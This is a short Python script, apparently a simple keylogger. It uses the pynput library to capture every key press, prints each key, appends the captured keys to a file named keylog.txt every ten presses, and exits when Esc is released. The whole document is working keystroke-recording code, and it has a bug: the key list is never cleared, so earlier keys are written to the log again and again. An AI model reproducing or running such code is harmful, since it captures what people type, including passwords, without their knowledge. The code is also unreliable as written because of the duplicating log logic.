import pynput

from pynput.keyboard import Key, Listener 

counter = 0
keysPressed = []

def on_press(key): 
	global counter, keysPressed

	keysPressed.append(key)
	counter += 1
	print('{0} pressed'.format(key))

	if counter >= 10: 
		counter = 0
		write_to_file(keysPressed)

def write_to_file(keysPressed):
	with open('keylog.txt', 'a') as pen:
		for key in keysPressed:
			pen.write(str(key) + '\n')

def on_release(key):
	if key == Key.esc: 
		return False

with Listener(on_press=on_press, on_release=on_release) as listener: 
	listener.join()
